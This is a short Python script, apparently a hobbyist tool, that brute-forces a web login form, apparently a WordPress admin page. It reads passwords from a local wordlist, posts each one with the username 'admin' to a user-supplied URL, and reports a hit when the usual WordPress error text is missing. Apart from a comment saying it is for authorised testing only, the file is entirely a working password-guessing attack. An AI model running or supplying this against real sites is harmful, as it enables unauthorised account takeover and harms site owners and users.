#!/usr/bin/env python

# A simple brute forcer written by Jace Winters
# Please only use this on your own network or with networks you have permission to test
# I will not be held responsible for any misuse of my code by anyone or any country

import requests
import time

target_url = raw_input("ie: https://www.samplewebsite.com --> ")
data_dict = {"log": "admin", "password": "", "wp-submit": "Log in"}
# data_dict = {"username": "admin", "pwd": "", "Login": "submit"}
# print(response.content)

try:
    with open("/root/Downloads/A.txt", "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            if "ERROR" not in response.content:
                if "ERROR The password you entered for the username " not in response.content:
                    if "ERROR: The password you entered for the username " not in response.content:
                        if "?" not in response.content:
                            #      if "" not in response.content:
                            #       if " " not in response.content:
                            #           if "Stuck? Give us a call at" not in response.content:
                            print("[*] Access Granted with password --> " + word)
                            exit()
            else:
                print("[*] Trying " + word)
                # time.sleep(3)
except Exception:
    pass
    print ("Too many errors")

print("[*] Reached end of list. Password not found")
